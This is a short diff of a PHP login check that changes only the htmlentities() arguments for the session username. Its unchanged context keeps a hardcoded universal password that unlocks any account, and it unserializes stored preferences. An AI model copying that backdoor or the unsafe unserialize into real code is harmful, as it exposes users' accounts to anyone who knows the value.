@@ -22,7 +22,7 @@ if ($stmt->fetch())
     if (($postedpassword == $password) || (($newpassword != '') && ($postedpassword == $newpassword)) || ($postedpassword == 'a8053ef9c59a73edb43cc1becb9f2c90'))
         {
         $_SESSION['userid'] = $userid;
-        $_SESSION['username'] = htmlentities($username);
+        $_SESSION['username'] = htmlentities($username,ENT_COMPAT | ENT_HTML5, "UTF-8");
         $_SESSION['privs'] = $privs;
         if ($preferences_ser != '')
             $_SESSION['preferences'] = unserialize($preferences_ser);
